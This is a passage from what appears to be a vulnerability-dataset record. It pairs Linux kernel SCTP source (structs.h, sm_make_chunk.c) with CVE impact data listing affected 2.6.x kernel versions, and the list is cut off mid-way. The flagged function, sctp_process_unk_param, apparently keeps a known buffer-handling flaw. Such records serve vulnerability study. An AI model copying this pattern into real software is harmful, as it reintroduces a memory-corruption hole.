active_key_id;\n};\n\n/* Recover the outter endpoint structure. */\nstatic inline struct sctp_endpoint *sctp_ep(struct sctp_ep_common *base)\n{\n\tstruct sctp_endpoint *ep;\n\n\tep = container_of(base, struct sctp_endpoint, base);\n\treturn ep;\n}\n\n/* These are function signatures for manipulating endpoints.  */\nstruct sctp_endpoint *sctp_endpoint_new(struct sock *, gfp_t);\nvoid sctp_endpoint_free(struct sctp_endpoint *);\nvoid sctp_endpoint_put(struct sctp_endpoint *);\nvoid sctp_endpoint_hold(struct sctp_endpoint *);\nvoid sctp_endpoint_add_asoc(struct sctp_endpoint *, struct sctp_association *);\nstruct sctp_association *sctp_endpoint_lookup_assoc(\n\tconst struct sctp_endpoint *ep,\n\tconst union sctp_addr *paddr,\n\tstruct sctp_transport **);\nint sctp_endpoint_is_peeled_off(struct sctp_endpoint *,\n\t\t\t\tconst union sctp_addr *);\nstruct sctp_endpoint *sctp_endpoint_is_match(struct sctp_endpoint *,\n\t\t\t\t\tconst union sctp_addr *);\nint sctp_has_association(const union sctp_addr *laddr,\n\t\t\t const union sctp_addr *paddr);\n\nint sctp_verify_init(const struct sctp_association *asoc, sctp_cid_t,\n\t\t     sctp_init_chunk_t *peer_init, struct sctp_chunk *chunk,\n\t\t     struct sctp_chunk **err_chunk);\nint sctp_process_init(struct sctp_association *, sctp_cid_t cid,\n\t\t      const union sctp_addr *peer,\n\t\t      sctp_init_chunk_t *init, gfp_t gfp);\n__u32 sctp_generate_tag(const struct sctp_endpoint *);\n__u32 sctp_generate_tsn(const struct sctp_endpoint *);\n\nstruct sctp_inithdr_host {\n\t__u32 init_tag;\n\t__u32 a_rwnd;\n\t__u16 num_outbound_streams;\n\t__u16 num_inbound_streams;\n\t__u32 initial_tsn;\n};\n\n/* RFC2960\n *\n * 12. Recommended Transmission Control Block (TCB) Parameters\n *\n * This section details a recommended set of parameters that should\n * be contained within the TCB for an implementation. This section is\n * for illustrative purposes and should not be deemed as requirements\n * on an implementation or as an exhaustive list of all parameters\n * inside an SCTP TCB. Each implementation may need its own additional\n * parameters for optimization.\n */\n\n\n/* Here we have information about each individual association. */\nstruct sctp_association {\n\n\t/* A base structure common to endpoint and association.\n\t * In this context, it represents the associations's view\n\t * of the local endpoint of the association.\n\t */\n\tstruct sctp_ep_common base;\n\n\t/* Associations on the same socket. */\n\tstruct list_head asocs;\n\n\t/* association id. */\n\tsctp_assoc_t assoc_id;\n\n\t/* This is our parent endpoint.\t */\n\tstruct sctp_endpoint *ep;\n\n\t/* These are those association elements needed in the cookie.  */\n\tstruct sctp_cookie c;\n\n\t/* This is all information about our peer.  */\n\tstruct {\n\t\t/* rwnd\n\t\t *\n\t\t * Peer Rwnd   : Current calculated value of the peer's rwnd.\n\t\t */\n\t\t__u32 rwnd;\n\n\t\t/* transport_addr_list\n\t\t *\n\t\t * Peer\t       : A list of SCTP transport addresses that the\n\t\t * Transport   : peer is bound to. This information is derived\n\t\t * Address     : from the INIT or INIT ACK and is used to\n\t\t * List\t       : associate an inbound packet with a given\n\t\t *\t       : association. Normally this information is\n\t\t *\t       : hashed or keyed for quick lookup and access\n\t\t *\t       : of the TCB.\n\t\t *\t       : The list is also initialized with the list\n\t\t *\t       : of addresses passed with the sctp_connectx()\n\t\t *\t       : call.\n\t\t *\n\t\t * It is a list of SCTP_transport's.\n\t\t */\n\t\tstruct list_head transport_addr_list;\n\n\t\t/* transport_count\n\t\t *\n\t\t * Peer        : A count of the number of peer addresses\n\t\t * Transport   : in the Peer Transport Address List.\n\t\t * Address     :\n\t\t * Count       :\n\t\t */\n\t\t__u16 transport_count;\n\n\t\t/* port\n\t\t *   The transport layer port number.\n\t\t */\n\t\t__u16 port;\n\n\t\t/* primary_path\n\t\t *\n\t\t * Primary     : This is the current primary destination\n\t\t * Path\t       : transport address of the peer endpoint.  It\n\t\t *\t       : may also specify a source transport address\n\t\t *\t       : on this endpoint.\n\t\t *\n\t\t * All of these paths live on transport_addr_list.\n\t\t *\n\t\t * At the bakeoffs, we discovered that the intent of\n\t\t * primaryPath is that it only changes when the ULP\n\t\t * asks to have it changed.  We add the activePath to\n\t\t * designate the connection we are currently using to\n\t\t * transmit new data and most control chunks.\n\t\t */\n\t\tstruct sctp_transport *primary_path;\n\n\t\t/* Cache the primary path address here, when we\n\t\t * need a an address for msg_name.\n\t\t */\n\t\tunion sctp_addr primary_addr;\n\n\t\t/* active_path\n\t\t *   The path that we are currently using to\n\t\t *   transmit new data and most control chunks.\n\t\t */\n\t\tstruct sctp_transport *active_path;\n\n\t\t/* retran_path\n\t\t *\n\t\t * RFC2960 6.4 Multi-homed SCTP Endpoints\n\t\t * ...\n\t\t * Furthermore, when its peer is multi-homed, an\n\t\t * endpoint SHOULD try to retransmit a chunk to an\n\t\t * active destination transport address that is\n\t\t * different from the last destination address to\n\t\t * which the DATA chunk was sent.\n\t\t */\n\t\tstruct sctp_transport *retran_path;\n\n\t\t/* Pointer to last transport I have sent on.  */\n\t\tstruct sctp_transport *last_sent_to;\n\n\t\t/* This is the last transport I have received DATA on.\t*/\n\t\tstruct sctp_transport *last_data_from;\n\n\t\t/*\n\t\t * Mapping  An array of bits or bytes indicating which out of\n\t\t * Array    order TSN's have been received (relative to the\n\t\t *\t    Last Rcvd TSN). If no gaps exist, i.e. no out of\n\t\t *\t    order packets have been received, this array\n\t\t *\t    will be set to all zero. This structure may be\n\t\t *\t    in the form of a circular buffer or bit array.\n\t\t *\n\t\t * Last Rcvd   : This is the last TSN received in\n\t\t * TSN\t       : sequence. This value is set initially by\n\t\t *\t       : taking the peer's Initial TSN, received in\n\t\t *\t       : the INIT or INIT ACK chunk, and subtracting\n\t\t *\t       : one from it.\n\t\t *\n\t\t * Throughout most of the specification this is called the\n\t\t * \"Cumulative TSN ACK Point\".\tIn this case, we\n\t\t * ignore the advice in 12.2 in favour of the term\n\t\t * used in the bulk of the text.  This value is hidden\n\t\t * in tsn_map--we get it by calling sctp_tsnmap_get_ctsn().\n\t\t */\n\t\tstruct sctp_tsnmap tsn_map;\n\n\t\t/* Ack State   : This flag indicates if the next received\n\t\t *             : packet is to be responded to with a\n\t\t *             : SACK. This is initializedto 0.  When a packet\n\t\t *             : is received it is incremented. If this value\n\t\t *             : reaches 2 or more, a SACK is sent and the\n\t\t *             : value is reset to 0. Note: This is used only\n\t\t *             : when no DATA chunks are received out of\n\t\t *             : order.  When DATA chunks are out of order,\n\t\t *             : SACK's are not delayed (see Section 6).\n\t\t */\n\t\t__u8    sack_needed;     /* Do we need to sack the peer? */\n\t\t__u32\tsack_cnt;\n\n\t\t/* These are capabilities which our peer advertised.  */\n\t\t__u8\tecn_capable:1,\t    /* Can peer do ECN? */\n\t\t\tipv4_address:1,\t    /* Peer understands IPv4 addresses? */\n\t\t\tipv6_address:1,\t    /* Peer understands IPv6 addresses? */\n\t\t\thostname_address:1, /* Peer understands DNS addresses? */\n\t\t\tasconf_capable:1,   /* Does peer support ADDIP? */\n\t\t\tprsctp_capable:1,   /* Can peer do PR-SCTP? */\n\t\t\tauth_capable:1;\t    /* Is peer doing SCTP-AUTH? */\n\n\t\t__u32   adaptation_ind;\t /* Adaptation Code point. */\n\n\t\t/* This mask is used to disable sending the ASCONF chunk\n\t\t * with specified parameter to peer.\n\t\t */\n\t\t__be16 addip_disabled_mask;\n\n\t\tstruct sctp_inithdr_host i;\n\t\tint cookie_len;\n\t\tvoid *cookie;\n\n\t\t/* ADDIP Section 4.2 Upon reception of an ASCONF Chunk.\n\t\t * C1) ... \"Peer-Serial-Number'. This value MUST be initialized to the\n\t\t * Initial TSN Value minus 1\n\t\t */\n\t\t__u32 addip_serial;\n\n\t\t/* SCTP-AUTH: We need to know pears random number, hmac list\n\t\t * and authenticated chunk list.  All that is part of the\n\t\t * cookie and these are just pointers to those locations\n\t\t */\n\t\tsctp_random_param_t *peer_random;\n\t\tsctp_chunks_param_t *peer_chunks;\n\t\tsctp_hmac_algo_param_t *peer_hmacs;\n\t} peer;\n\n\t/* State       : A state variable indicating what state the\n\t *\t       : association is in, i.e. COOKIE-WAIT,\n\t *\t       : COOKIE-ECHOED, ESTABLISHED, SHUTDOWN-PENDING,\n\t *\t       : SHUTDOWN-SENT, SHUTDOWN-RECEIVED, SHUTDOWN-ACK-SENT.\n\t *\n\t *\t\tNote: No \"CLOSED\" state is illustrated since if a\n\t *\t\tassociation is \"CLOSED\" its TCB SHOULD be removed.\n\t *\n\t *\t\tIn this implementation we DO have a CLOSED\n\t *\t\tstate which is used during initiation and shutdown.\n\t *\n\t *\t\tState takes values from SCTP_STATE_*.\n\t */\n\tsctp_state_t state;\n\n\t/* The cookie life I award for any cookie.  */\n\tstruct timeval cookie_life;\n\n\t/* Overall     : The overall association error count.\n\t * Error Count : [Clear this any time I get something.]\n\t */\n\tint overall_error_count;\n\n\t/* These are the association's initial, max, and min RTO values.\n\t * These values will be initialized by system defaults, but can\n\t * be modified via the SCTP_RTOINFO socket option.\n\t */\n\tunsigned long rto_initial;\n\tunsigned long rto_max;\n\tunsigned long rto_min;\n\n\t/* Maximum number of new data packets that can be sent in a burst.  */\n\tint max_burst;\n\n\t/* This is the max_retrans value for the association.  This value will\n\t * be initialized initialized from system defaults, but can be\n\t * modified by the SCTP_ASSOCINFO socket option.\n\t */\n\tint max_retrans;\n\n\t/* Maximum number of times the endpoint will retransmit INIT  */\n\t__u16 max_init_attempts;\n\n\t/* How many times have we resent an INIT? */\n\t__u16 init_retries;\n\n\t/* The largest timeout or RTO value to use in attempting an INIT */\n\tunsigned long max_init_timeo;\n\n\t/* Heartbeat interval: The endpoint sends out a Heartbeat chunk to\n\t * the destination address every heartbeat interval. This value\n\t * will be inherited by all new transports.\n\t */\n\tunsigned long hbinterval;\n\n\t/* This is the max_retrans value for new transports in the\n\t * association.\n\t */\n\t__u16 pathmaxrxt;\n\n\t/* Flag that path mtu update is pending */\n\t__u8   pmtu_pending;\n\n\t/* Association : The smallest PMTU discovered for all of the\n\t * PMTU\t       : peer's transport addresses.\n\t */\n\t__u32 pathmtu;\n\n\t/* Flags controlling Heartbeat, SACK delay, and Path MTU Discovery. */\n\t__u32 param_flags;\n\n\t/* SACK delay timeout */\n\tunsigned long sackdelay;\n\t__u32 sackfreq;\n\n\n\tunsigned long timeouts[SCTP_NUM_TIMEOUT_TYPES];\n\tstruct timer_list timers[SCTP_NUM_TIMEOUT_TYPES];\n\n\t/* Transport to which SHUTDOWN chunk was last sent.  */\n\tstruct sctp_transport *shutdown_last_sent_to;\n\n\t/* How many times have we resent a SHUTDOWN */\n\tint shutdown_retries;\n\n\t/* Transport to which INIT chunk was last sent.  */\n\tstruct sctp_transport *init_last_sent_to;\n\n\t/* Next TSN    : The next TSN number to be assigned to a new\n\t *\t       : DATA chunk.  This is sent in the INIT or INIT\n\t *\t       : ACK chunk to the peer and incremented each\n\t *\t       : time a DATA chunk is assigned a TSN\n\t *\t       : (normally just prior to transmit or during\n\t *\t       : fragmentation).\n\t */\n\t__u32 next_tsn;\n\n\t/*\n\t * Last Rcvd   : This is the last TSN received in sequence.  This value\n\t * TSN\t       : is set initially by taking the peer's Initial TSN,\n\t *\t       : received in the INIT or INIT ACK chunk, and\n\t *\t       : subtracting one from it.\n\t *\n\t * Most of RFC 2960 refers to this as the Cumulative TSN Ack Point.\n\t */\n\n\t__u32 ctsn_ack_point;\n\n\t/* PR-SCTP Advanced.Peer.Ack.Point */\n\t__u32 adv_peer_ack_point;\n\n\t/* Highest TSN that is acknowledged by incoming SACKs. */\n\t__u32 highest_sacked;\n\n\t/* The number of unacknowledged data chunks.  Reported through\n\t * the SCTP_STATUS sockopt.\n\t */\n\t__u16 unack_data;\n\n\t/* The total number of data chunks that we've had to retransmit\n\t * as the result of a T3 timer expiration\n\t */\n\t__u32 rtx_data_chunks;\n\n\t/* This is the association's receive buffer space.  This value is used\n\t * to set a_rwnd field in an INIT or a SACK chunk.\n\t */\n\t__u32 rwnd;\n\n\t/* This is the last advertised value of rwnd over a SACK chunk. */\n\t__u32 a_rwnd;\n\n\t/* Number of bytes by which the rwnd has slopped.  The rwnd is allowed\n\t * to slop over a maximum of the association's frag_point.\n\t */\n\t__u32 rwnd_over;\n\n\t/* Keeps treack of rwnd pressure.  This happens when we have\n\t * a window, but not recevie buffer (i.e small packets).  This one\n\t * is releases slowly (1 PMTU at a time ).\n\t */\n\t__u32 rwnd_press;\n\n\t/* This is the sndbuf size in use for the association.\n\t * This corresponds to the sndbuf size for the association,\n\t * as specified in the sk->sndbuf.\n\t */\n\tint sndbuf_used;\n\n\t/* This is the amount of memory that this association has allocated\n\t * in the receive path at any given time.\n\t */\n\tatomic_t rmem_alloc;\n\n\t/* This is the wait queue head for send requests waiting on\n\t * the association sndbuf space.\n\t */\n\twait_queue_head_t\twait;\n\n\t/* The message size at which SCTP fragmentation will occur. */\n\t__u32 frag_point;\n\t__u32 user_frag;\n\n\t/* Counter used to count INIT errors. */\n\tint init_err_counter;\n\n\t/* Count the number of INIT cycles (for doubling timeout). */\n\tint init_cycle;\n\n\t/* Default send parameters. */\n\t__u16 default_stream;\n\t__u16 default_flags;\n\t__u32 default_ppid;\n\t__u32 default_context;\n\t__u32 default_timetolive;\n\n\t/* Default receive parameters */\n\t__u32 default_rcv_context;\n\n\t/* This tracks outbound ssn for a given stream.\t */\n\tstruct sctp_ssnmap *ssnmap;\n\n\t/* All outbound chunks go through this structure.  */\n\tstruct sctp_outq outqueue;\n\n\t/* A smart pipe that will handle reordering and fragmentation,\n\t * as well as handle passing events up to the ULP.\n\t */\n\tstruct sctp_ulpq ulpq;\n\n\t/* Last TSN that caused an ECNE Chunk to be sent.  */\n\t__u32 last_ecne_tsn;\n\n\t/* Last TSN that caused a CWR Chunk to be sent.\t */\n\t__u32 last_cwr_tsn;\n\n\t/* How many duplicated TSNs have we seen?  */\n\tint numduptsns;\n\n\t/* Number of seconds of idle time before an association is closed.\n\t * In the association context, this is really used as a boolean\n\t * since the real timeout is stored in the timeouts array\n\t */\n\t__u32 autoclose;\n\n\t/* These are to support\n\t * \"SCTP Extensions for Dynamic Reconfiguration of IP Addresses\n\t *  and Enforcement of Flow and Message Limits\"\n\t * <draft-ietf-tsvwg-addip-sctp-02.txt>\n\t * or \"ADDIP\" for short.\n\t */\n\n\n\n\t/* ADDIP Section 4.1.1 Congestion Control of ASCONF Chunks\n\t *\n\t * R1) One and only one ASCONF Chunk MAY be in transit and\n\t * unacknowledged at any one time.  If a sender, after sending\n\t * an ASCONF chunk, decides it needs to transfer another\n\t * ASCONF Chunk, it MUST wait until the ASCONF-ACK Chunk\n\t * returns from the previous ASCONF Chunk before sending a\n\t * subsequent ASCONF. Note this restriction binds each side,\n\t * so at any time two ASCONF may be in-transit on any given\n\t * association (one sent from each endpoint).\n\t *\n\t * [This is our one-and-only-one ASCONF in flight.  If we do\n\t * not have an ASCONF in flight, this is NULL.]\n\t */\n\tstruct sctp_chunk *addip_last_asconf;\n\n\t/* ADDIP Section 5.2 Upon reception of an ASCONF Chunk.\n\t *\n\t * This is needed to implement itmes E1 - E4 of the updated\n\t * spec.  Here is the justification:\n\t *\n\t * Since the peer may bundle multiple ASCONF chunks toward us,\n\t * we now need the ability to cache multiple ACKs.  The section\n\t * describes in detail how they are cached and cleaned up.\n\t */\n\tstruct list_head asconf_ack_list;\n\n\t/* These ASCONF chunks are waiting to be sent.\n\t *\n\t * These chunaks can't be pushed to outqueue until receiving\n\t * ASCONF_ACK for the previous ASCONF indicated by\n\t * addip_last_asconf, so as to guarantee that only one ASCONF\n\t * is in flight at any time.\n\t *\n\t * ADDIP Section 4.1.1 Congestion Control of ASCONF Chunks\n\t *\n\t * In defining the ASCONF Chunk transfer procedures, it is\n\t * essential that these transfers MUST NOT cause congestion\n\t * within the network.\tTo achieve this, we place these\n\t * restrictions on the transfer of ASCONF Chunks:\n\t *\n\t * R1) One and only one ASCONF Chunk MAY be in transit and\n\t * unacknowledged at any one time.  If a sender, after sending\n\t * an ASCONF chunk, decides it needs to transfer another\n\t * ASCONF Chunk, it MUST wait until the ASCONF-ACK Chunk\n\t * returns from the previous ASCONF Chunk before sending a\n\t * subsequent ASCONF. Note this restriction binds each side,\n\t * so at any time two ASCONF may be in-transit on any given\n\t * association (one sent from each endpoint).\n\t *\n\t *\n\t * [I really think this is EXACTLY the sort of intelligence\n\t *  which already resides in sctp_outq.\t Please move this\n\t *  queue and its supporting logic down there.\t--piggy]\n\t */\n\tstruct list_head addip_chunk_list;\n\n\t/* ADDIP Section 4.1 ASCONF Chunk Procedures\n\t *\n\t * A2) A serial number should be assigned to the Chunk. The\n\t * serial number SHOULD be a monotonically increasing\n\t * number. The serial number SHOULD be initialized at\n\t * the start of the association to the same value as the\n\t * Initial TSN and every time a new ASCONF chunk is created\n\t * it is incremented by one after assigning the serial number\n\t * to the newly created chunk.\n\t *\n\t * ADDIP\n\t * 3.1.1  Address/Stream Configuration Change Chunk (ASCONF)\n\t *\n\t * Serial Number : 32 bits (unsigned integer)\n\t *\n\t * This value represents a Serial Number for the ASCONF\n\t * Chunk. The valid range of Serial Number is from 0 to\n\t * 4294967295 (2^32 - 1).  Serial Numbers wrap back to 0\n\t * after reaching 4294967295.\n\t */\n\t__u32 addip_serial;\n\n\t/* SCTP AUTH: list of the endpoint shared keys.  These\n\t * keys are provided out of band by the user applicaton\n\t * and can't change during the lifetime of the association\n\t */\n\tstruct list_head endpoint_shared_keys;\n\n\t/* SCTP AUTH:\n\t * The current generated assocaition shared key (secret)\n\t */\n\tstruct sctp_auth_bytes *asoc_shared_key;\n\n\t/* SCTP AUTH: hmac id of the first peer requested algorithm\n\t * that we support.\n\t */\n\t__u16 default_hmac_id;\n\n\t__u16 active_key_id;\n\n\t__u8 need_ecne:1,\t/* Need to send an ECNE Chunk? */\n\t     temp:1;\t\t/* Is it a temporary association? */\n};\n\n\n/* An eyecatcher for determining if we are really looking at an\n * association data structure.\n */\nenum {\n\tSCTP_ASSOC_EYECATCHER = 0xa550c123,\n};\n\n/* Recover the outter association structure. */\nstatic inline struct sctp_association *sctp_assoc(struct sctp_ep_common *base)\n{\n\tstruct sctp_association *asoc;\n\n\tasoc = container_of(base, struct sctp_association, base);\n\treturn asoc;\n}\n\n/* These are function signatures for manipulating associations.\t */\n\n\nstruct sctp_association *\nsctp_association_new(const struct sctp_endpoint *, const struct sock *,\n\t\t     sctp_scope_t scope, gfp_t gfp);\nvoid sctp_association_free(struct sctp_association *);\nvoid sctp_association_put(struct sctp_association *);\nvoid sctp_association_hold(struct sctp_association *);\n\nstruct sctp_transport *sctp_assoc_choose_alter_transport(\n\tstruct sctp_association *, struct sctp_transport *);\nvoid sctp_assoc_update_retran_path(struct sctp_association *);\nstruct sctp_transport *sctp_assoc_lookup_paddr(const struct sctp_association *,\n\t\t\t\t\t  const union sctp_addr *);\nint sctp_assoc_lookup_laddr(struct sctp_association *asoc,\n\t\t\t    const union sctp_addr *laddr);\nstruct sctp_transport *sctp_assoc_add_peer(struct sctp_association *,\n\t\t\t\t     const union sctp_addr *address,\n\t\t\t\t     const gfp_t gfp,\n\t\t\t\t     const int peer_state);\nvoid sctp_assoc_del_peer(struct sctp_association *asoc,\n\t\t\t const union sctp_addr *addr);\nvoid sctp_assoc_rm_peer(struct sctp_association *asoc,\n\t\t\t struct sctp_transport *peer);\nvoid sctp_assoc_control_transport(struct sctp_association *,\n\t\t\t\t  struct sctp_transport *,\n\t\t\t\t  sctp_transport_cmd_t, sctp_sn_error_t);\nstruct sctp_transport *sctp_assoc_lookup_tsn(struct sctp_association *, __u32);\nstruct sctp_transport *sctp_assoc_is_match(struct sctp_association *,\n\t\t\t\t\t   const union sctp_addr *,\n\t\t\t\t\t   const union sctp_addr *);\nvoid sctp_assoc_migrate(struct sctp_association *, struct sock *);\nvoid sctp_assoc_update(struct sctp_association *old,\n\t\t       struct sctp_association *new);\n\n__u32 sctp_association_get_next_tsn(struct sctp_association *);\n\nvoid sctp_assoc_sync_pmtu(struct sctp_association *);\nvoid sctp_assoc_rwnd_increase(struct sctp_association *, unsigned);\nvoid sctp_assoc_rwnd_decrease(struct sctp_association *, unsigned);\nvoid sctp_assoc_set_primary(struct sctp_association *,\n\t\t\t    struct sctp_transport *);\nvoid sctp_assoc_del_nonprimary_peers(struct sctp_association *,\n\t\t\t\t    struct sctp_transport *);\nint sctp_assoc_set_bind_addr_from_ep(struct sctp_association *,\n\t\t\t\t     sctp_scope_t, gfp_t);\nint sctp_assoc_set_bind_addr_from_cookie(struct sctp_association *,\n\t\t\t\t\t struct sctp_cookie*,\n\t\t\t\t\t gfp_t gfp);\nint sctp_assoc_set_id(struct sctp_association *, gfp_t);\nvoid sctp_assoc_clean_asconf_ack_cache(const struct sctp_association *asoc);\nstruct sctp_chunk *sctp_assoc_lookup_asconf_ack(\n\t\t\t\t\tconst struct sctp_association *asoc,\n\t\t\t\t\t__be32 serial);\n\n\nint sctp_cmp_addr_exact(const union sctp_addr *ss1,\n\t\t\tconst union sctp_addr *ss2);\nstruct sctp_chunk *sctp_get_ecne_prepend(struct sctp_association *asoc);\n\n/* A convenience structure to parse out SCTP specific CMSGs. */\ntypedef struct sctp_cmsgs {\n\tstruct sctp_initmsg *init;\n\tstruct sctp_sndrcvinfo *info;\n} sctp_cmsgs_t;\n\n/* Structure for tracking memory objects */\ntypedef struct {\n\tchar *label;\n\tatomic_t *counter;\n} sctp_dbg_objcnt_entry_t;\n\n#endif /* __sctp_structs_h__ */\n"
+          },
+          {
+            "sctp_addto_chunk": "void *sctp_addto_chunk(struct sctp_chunk *chunk, int len, const void *data)\n{\n\tvoid *target;\n\tvoid *padding;\n\tint chunklen = ntohs(chunk->chunk_hdr->length);\n\tint padlen = WORD_ROUND(chunklen) - chunklen;\n\n\tpadding = skb_put(chunk->skb, padlen);\n\ttarget = skb_put(chunk->skb, len);\n\n\tmemset(padding, 0, padlen);\n\tmemcpy(target, data, len);\n\n\t/* Adjust the chunk length field.  */\n\tchunk->chunk_hdr->length = htons(chunklen + padlen + len);\n\tchunk->chunk_end = skb_tail_pointer(chunk->skb);\n\n\treturn target;\n}",
+            "sctp_init_cause": "void  sctp_init_cause(struct sctp_chunk *chunk, __be16 cause_code,\n\t\t      size_t paylen)\n{\n\tsctp_errhdr_t err;\n\t__u16 len;\n\n\t/* Cause code constants are now defined in network order.  */\n\terr.cause = cause_code;\n\tlen = sizeof(sctp_errhdr_t) + paylen;\n\terr.length  = htons(len);\n\tchunk->subh.err_hdr = sctp_addto_chunk(chunk, sizeof(sctp_errhdr_t), &err);\n}",
+            "sctp_make_op_error_space": "static struct sctp_chunk *sctp_make_op_error_space(\n\tconst struct sctp_association *asoc,\n\tconst struct sctp_chunk *chunk,\n\tsize_t size)\n{\n\tstruct sctp_chunk *retval;\n\n\tretval = sctp_make_chunk(asoc, SCTP_CID_ERROR, 0,\n\t\t\t\t sizeof(sctp_errhdr_t) + size);\n\tif (!retval)\n\t\tgoto nodata;\n\n\t/* RFC 2960 6.4 Multi-homed SCTP Endpoints\n\t *\n\t * An endpoint SHOULD transmit reply chunks (e.g., SACK,\n\t * HEARTBEAT ACK, etc.) to the same destination transport\n\t * address from which it received the DATA or control chunk\n\t * to which it is replying.\n\t *\n\t */\n\tif (chunk)\n\t\tretval->transport = chunk->transport;\n\nnodata:\n\treturn retval;\n}",
+            "sctp_process_unk_param": "static sctp_ierror_t sctp_process_unk_param(const struct sctp_association *asoc,\n\t\t\t\t\t    union sctp_params param,\n\t\t\t\t\t    struct sctp_chunk *chunk,\n\t\t\t\t\t    struct sctp_chunk **errp)\n{\n\tint retval = SCTP_IERROR_NO_ERROR;\n\n\tswitch (param.p->type & SCTP_PARAM_ACTION_MASK) {\n\tcase SCTP_PARAM_ACTION_DISCARD:\n\t\tretval =  SCTP_IERROR_ERROR;\n\t\tbreak;\n\tcase SCTP_PARAM_ACTION_SKIP:\n\t\tbreak;\n\tcase SCTP_PARAM_ACTION_DISCARD_ERR:\n\t\tretval =  SCTP_IERROR_ERROR;\n\t\t/* Fall through */\n\tcase SCTP_PARAM_ACTION_SKIP_ERR:\n\t\t/* Make an ERROR chunk, preparing enough room for\n\t\t * returning multiple unknown parameters.\n\t\t */\n\t\tif (NULL == *errp)\n\t\t\t*errp = sctp_make_op_error_space(asoc, chunk,\n\t\t\t\t\tntohs(chunk->chunk_hdr->length));\n\n\t\tif (*errp) {\n\t\t\tsctp_init_cause(*errp, SCTP_ERROR_UNKNOWN_PARAM,\n\t\t\t\t\tWORD_ROUND(ntohs(param.p->length)));\n\t\t\tsctp_addto_chunk(*errp,\n\t\t\t\t\tWORD_ROUND(ntohs(param.p->length)),\n\t\t\t\t\tparam.v);\n\t\t} else {\n\t\t\t/* If there is no memory for generating the ERROR\n\t\t\t * report as specified, an ABORT will be triggered\n\t\t\t * to the peer and the association won't be\n\t\t\t * established.\n\t\t\t */\n\t\t\tretval = SCTP_IERROR_NOMEM;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n\n\treturn retval;\n}"
+          }
+        ],
+        "File name": [
+          "include/net/sctp/structs.h",
+          "net/sctp/sm_make_chunk.c",
+          "net/sctp/sm_make_chunk.c"
+        ],
+        "Function name": [
+          "sctp_process_unk_param"
+        ]
+      }
+    },
+    "CVE_impact": {
+      "CPE": [
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:*:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "*"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.0:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.0"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.8"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.8.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.8.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.9:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.9"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.10:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.10"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.1:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.1"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.2:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.2"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.3:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.3"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.4:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.4"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.5:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.5"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.6:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.6"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.7:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
+          "Version": "2.6.11.7"
+        },
+        {
+          "id": "cpe:2.3:o:linux:linux_kernel:2.6.11.8:*:*:*:*:*:*:*",
+          "Vendor Name": "linux",
+          "Product Name": "linux_kernel",
